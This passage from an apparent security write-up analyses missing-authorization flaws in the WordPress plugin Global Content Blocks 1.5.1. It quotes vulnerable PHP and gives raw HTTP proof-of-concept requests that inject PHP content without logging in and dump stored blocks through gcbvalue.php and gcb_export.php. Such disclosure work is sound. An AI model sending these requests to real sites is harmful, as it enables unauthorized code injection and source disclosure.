<p>So it starts by doing some initializations, validate that all the input is there that it needs, and do mostly best-practice sanitization. It then inserts the value into a database and returns the same value back in json format. The problem here is that at no point has the script checked that the calling user is logged in, and is an admin(This is important because it allows for inserting PHP code, which could cause an arbitrary code execution).</p>
<p>It does sanitization of all values but the name, but as it turns out this is all output encoded in the admin interface. But we&#8217;re still able to insert arbitrary content into the table without authentication, which could be bad due to the possibility of PHP code being inserted. This can be exploited like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878c55269364300702" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/global-content-blocks/resources/tinymce/gcb_ajax_add.php HTTP/1.1
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 129

name=My malicious request&amp;content=echo 'Hello buddy', nice day';&amp;type=php&amp;description=This is really not malicious code, I swear.</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878c55269364300702-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c55269364300702-2">2</div><div class="crayon-num" data-line="crayon-53c9878c55269364300702-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c55269364300702-4">4</div><div class="crayon-num" data-line="crayon-53c9878c55269364300702-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c55269364300702-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878c55269364300702-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-m">global</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">-</span><span class="crayon-i">blocks</span><span class="crayon-o">/</span><span class="crayon-i">resources</span><span class="crayon-o">/</span><span class="crayon-i">tinymce</span><span class="crayon-o">/</span><span class="crayon-v">gcb_ajax_add</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c55269364300702-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c9878c55269364300702-3"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c55269364300702-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">129</span></div><div class="crayon-line" id="crayon-53c9878c55269364300702-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c55269364300702-6"><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-e">My </span><span class="crayon-e">malicious </span><span class="crayon-i">request</span><span class="crayon-o">&amp;</span><span class="crayon-v">content</span><span class="crayon-o">=</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">'Hello buddy'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">nice </span><span class="crayon-i">day</span>'<span class="crayon-sy">;</span><span class="crayon-o">&amp;</span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-i">php</span><span class="crayon-o">&amp;</span><span class="crayon-v">description</span><span class="crayon-o">=</span><span class="crayon-r">This</span><span class="crayon-h"> </span><span class="crayon-st">is</span><span class="crayon-h"> </span><span class="crayon-e">really </span><span class="crayon-st">not</span><span class="crayon-h"> </span><span class="crayon-e">malicious </span><span class="crayon-i">code</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">I</span><span class="crayon-h"> </span><span class="crayon-v">swear</span><span class="crayon-sy">.</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0048 seconds] -->
<p><strong>Analysis of gdbvalue.php vulnerability</strong><br />
Another part of the admin interface is used to fetch the value of a content block, i.e the php code or other trip of content that may be reused on pages. In cases where it is php code, source code disclosure is a concern. The next 3 vulnerabilities allows for disclosure of block contents. The first one is in [/resources/tinymce/gcbvalue.php](http://plugins.svn.wordpress.org/global-content-blocks/tags/1.5.1/resources/tinymce/gcbvalue.php):</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878c55270857194586" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
if(!isset($_POST["id"]) || intval($_POST["id"])get_row("select value from ".$wpdb-&gt;prefix."gcb where id=".$gcb_id);
if($val!==null) {
    echo stripslashes(htmlspecialchars_decode($val-&gt;value));
}
die();</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878c55270857194586-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c55270857194586-2">2</div><div class="crayon-num" data-line="crayon-53c9878c55270857194586-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c55270857194586-4">4</div><div class="crayon-num" data-line="crayon-53c9878c55270857194586-5">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878c55270857194586-1"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">"id"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-e">intval</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">"id"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-e">get_row</span><span class="crayon-sy">(</span><span class="crayon-s">"select value from "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"gcb where id="</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">gcb_id</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c55270857194586-2"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">val</span><span class="crayon-o">!==</span><span class="crayon-t">null</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878c55270857194586-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">echo </span><span class="crayon-e">stripslashes</span><span class="crayon-sy">(</span><span class="crayon-e">htmlspecialchars_decode</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">val</span><span class="crayon-o">-&gt;</span><span class="crayon-i">value</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c55270857194586-4"><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9878c55270857194586-5"><span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0033 seconds] -->
<p>We see some validation of the input id to prevent SQL injection, and then a SQL query which will be used to print out the value(Code/markup) to the page. There is no validation that the caller is an admin, which means we can fetch the value(Which can be PHP code) with a simple HTTP request</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878c55277785010999" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/global-content-blocks/resources/tinymce/gcbvalue.php HTTP/1.1
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 4

id=1</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878c55277785010999-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c55277785010999-2">2</div><div class="crayon-num" data-line="crayon-53c9878c55277785010999-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c55277785010999-4">4</div><div class="crayon-num" data-line="crayon-53c9878c55277785010999-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c55277785010999-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878c55277785010999-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-m">global</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">-</span><span class="crayon-i">blocks</span><span class="crayon-o">/</span><span class="crayon-i">resources</span><span class="crayon-o">/</span><span class="crayon-i">tinymce</span><span class="crayon-o">/</span><span class="crayon-v">gcbvalue</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c55277785010999-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c9878c55277785010999-3"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c55277785010999-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">4</span></div><div class="crayon-line" id="crayon-53c9878c55277785010999-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c55277785010999-6"><span class="crayon-v">id</span><span class="crayon-o">=</span><span class="crayon-cn">1</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0032 seconds] -->
<p>This will disclose the contents of the block, which may contain PHP code that may contain secrets.</p>
<p>Analysis of gcb_export.php vulnerability<br />
A feature that the admin panel of this plugin is that it will export the block defined for easy import into another blog. It does so by calling <a href="http://plugins.svn.wordpress.org/global-content-blocks/tags/1.5.1/gcb/gcb_export.php">/gcb/gcb_export.php</a>, which forces the browser to download a .gcb file which contains base64 encoded content.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878c5527e434251205" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
if(!isset($_GET["gcb"])) (die("Please select some values"));
require_once('../../../../wp-load.php');
global $wpdb;

$ids = explode(";",$_GET["gcb"]);
$final_text = array();

foreach($ids as $id) {
    if(intval($id)&gt;0) {
        $entry = $wpdb-&gt;get_row("select * from ".$wpdb-&gt;prefix."gcb where id=".intval(mysql_real_escape_string($id)));
        $final_text[] =
        base64_encode($entry-&gt;name)."".
        base64_encode($entry-&gt;description)."".
        base64_encode($entry-&gt;value)."".
        base64_encode($entry-&gt;type);        
    }
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878c5527e434251205-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c5527e434251205-2">2</div><div class="crayon-num" data-line="crayon-53c9878c5527e434251205-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c5527e434251205-4">4</div><div class="crayon-num" data-line="crayon-53c9878c5527e434251205-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c5527e434251205-6">6</div><div class="crayon-num" data-line="crayon-53c9878c5527e434251205-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c5527e434251205-8">8</div><div class="crayon-num" data-line="crayon-53c9878c5527e434251205-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c5527e434251205-10">10</div><div class="crayon-num" data-line="crayon-53c9878c5527e434251205-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c5527e434251205-12">12</div><div class="crayon-num" data-line="crayon-53c9878c5527e434251205-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c5527e434251205-14">14</div><div class="crayon-num" data-line="crayon-53c9878c5527e434251205-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c5527e434251205-16">16</div><div class="crayon-num" data-line="crayon-53c9878c5527e434251205-17">17</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878c5527e434251205-1"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">"gcb"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-s">"Please select some values"</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c5527e434251205-2"><span class="crayon-e">require_once</span><span class="crayon-sy">(</span><span class="crayon-s">'../../../../wp-load.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878c5527e434251205-3"><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c5527e434251205-4">&nbsp;</div><div class="crayon-line" id="crayon-53c9878c5527e434251205-5"><span class="crayon-sy">$</span><span class="crayon-v">ids</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">explode</span><span class="crayon-sy">(</span><span class="crayon-s">";"</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">"gcb"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c5527e434251205-6"><span class="crayon-sy">$</span><span class="crayon-v">final_text</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878c5527e434251205-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c5527e434251205-8"><span class="crayon-st">foreach</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-e">ids </span><span class="crayon-st">as</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">id</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878c5527e434251205-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-e">intval</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">id</span><span class="crayon-sy">)</span><span class="crayon-o">&gt;</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c5527e434251205-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">entry</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_row</span><span class="crayon-sy">(</span><span class="crayon-s">"select * from "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"gcb where id="</span><span class="crayon-sy">.</span><span class="crayon-e">intval</span><span class="crayon-sy">(</span><span class="crayon-e">mysql_real_escape_string</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">id</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878c5527e434251205-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">final_text</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c5527e434251205-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">base64_encode</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">entry</span><span class="crayon-o">-&gt;</span><span class="crayon-i">name</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">""</span><span class="crayon-sy">.</span></div><div class="crayon-line" id="crayon-53c9878c5527e434251205-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">base64_encode</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">entry</span><span class="crayon-o">-&gt;</span><span class="crayon-i">description</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">""</span><span class="crayon-sy">.</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c5527e434251205-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">base64_encode</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">entry</span><span class="crayon-o">-&gt;</span><span class="crayon-i">value</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">""</span><span class="crayon-sy">.</span></div><div class="crayon-line" id="crayon-53c9878c5527e434251205-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">base64_encode</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">entry</span><span class="crayon-o">-&gt;</span><span class="crayon-i">type</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c5527e434251205-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9878c5527e434251205-17"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0081 seconds] -->
<p>Again there is a lack of validation that the user is logged in and has sufficient privileges to view this data normally. And because it may contain php code that is sensitive, it offers a source code disclosure vulnerability we can exploit like this. Note the semi-colon separated id list, which makes this very handy.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878c55285101998182" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /wordpress/wp-content/plugins/global-content-blocks/gcb/gcb_export.php?gcb=1;2;3 HTTP/1.1
Host: 192.168.80.130</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878c55285101998182-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c55285101998182-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878c55285101998182-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-m">global</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">-</span><span class="crayon-i">blocks</span><span class="crayon-o">/</span><span class="crayon-i">gcb</span><span class="crayon-o">/</span><span class="crayon-v">gcb_export</span><span class="crayon-sy">.</span><span class="crayon-i">php</span><span class="crayon-sy">?</span><span class="crayon-v">gcb</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-sy">;</span><span class="crayon-cn">2</span><span class="crayon-sy">;</span><span class="crayon-cn">3</span><span class="crayon-h"> </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c55285101998182-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0023 seconds] -->
<p></p>
					</div><!-- .entry-content -->

	<footer class="entry-meta">
